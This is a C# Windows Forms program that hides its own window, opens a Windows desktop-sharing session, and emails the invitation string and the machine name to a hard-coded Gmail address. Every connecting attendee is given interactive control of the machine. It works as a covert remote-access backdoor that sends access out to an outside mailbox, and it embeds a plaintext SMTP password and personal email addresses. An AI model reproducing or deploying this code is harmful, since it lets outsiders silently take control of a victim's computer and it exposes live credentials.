using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using RDPCOMAPILib;
using System.Net.Mail;

namespace hiddenjewel
{
    public partial class Form1 : Form
    {
        private NotifyIcon trayIcon;
        private ContextMenu trayMenu;
        RDPSession s = new RDPSession();
        public Form1()
        {
            InitializeComponent();
            // Create a simple tray menu with only one item.
            trayMenu = new ContextMenu();
            trayMenu.MenuItems.Add("Exit", OnExit);

            // Create a tray icon. In this example we use a
            // standard system icon for simplicity, but you
            // can of course use your own custom icon too.
            trayIcon = new NotifyIcon();
            trayIcon.Text = "Jewel";
            trayIcon.Icon = new Icon(SystemIcons.WinLogo, 40, 40);

            // Add menu to tray icon and show it.
            trayIcon.ContextMenu = trayMenu;
            trayIcon.Visible = true;
            s.OnAttendeeConnected += Incoming;
            s.Open();
            IRDPSRAPIInvitation Invitation = s.Invitations.CreateInvitation("Test01", "MyGroup", "", 2);
            string invitetext = Invitation.ConnectionString;
            sendmail(invitetext, System.Environment.MachineName);
        }

        private void sendmail(string body, string computername)
        {
            MailMessage mail = new MailMessage("raspberry104779218@gmail.com", "patay.gyula@gmail.com");
            mail.BodyEncoding = UTF8Encoding.UTF8;
            mail.DeliveryNotificationOptions = DeliveryNotificationOptions.OnFailure;
            SmtpClient client = new SmtpClient();
            client.Credentials = new System.Net.NetworkCredential("raspberry104779218@gmail.com", "Merkur21");
            //client.
            client.Port = 587;
            client.EnableSsl = true;
            client.Timeout = 10000;
            client.DeliveryMethod = SmtpDeliveryMethod.Network;
            //client.UseDefaultCredentials = false;
            client.Host = "smtp.gmail.com";
            mail.Subject = computername;
            mail.Body = body;
            client.Send(mail);
        }
        protected override void OnLoad(EventArgs e)
        {
            Visible = false; // Hide form window.
            ShowInTaskbar = false; // Remove from taskbar.

            base.OnLoad(e);
        }
        private void Incoming(object Guest)
        {
            IRDPSRAPIAttendee MyGuest = (IRDPSRAPIAttendee)Guest;
            MyGuest.ControlLevel = CTRL_LEVEL.CTRL_LEVEL_INTERACTIVE;
            //MyGuest.ControlLevel = CTRL_LEVEL.CTRL_LEVEL_VIEW;
        }
        private void Form1_Load(object sender, EventArgs e)
        {

            
        }

        private void OnExit(object sender, EventArgs e)
        {
            Application.Exit();
        }

        /*protected override void Dispose(bool isDisposing)
        {
            if (isDisposing)
            {
                // Release the icon resource.
                trayIcon.Dispose();
            }

            base.Dispose(isDisposing);
        }*/

    }
}
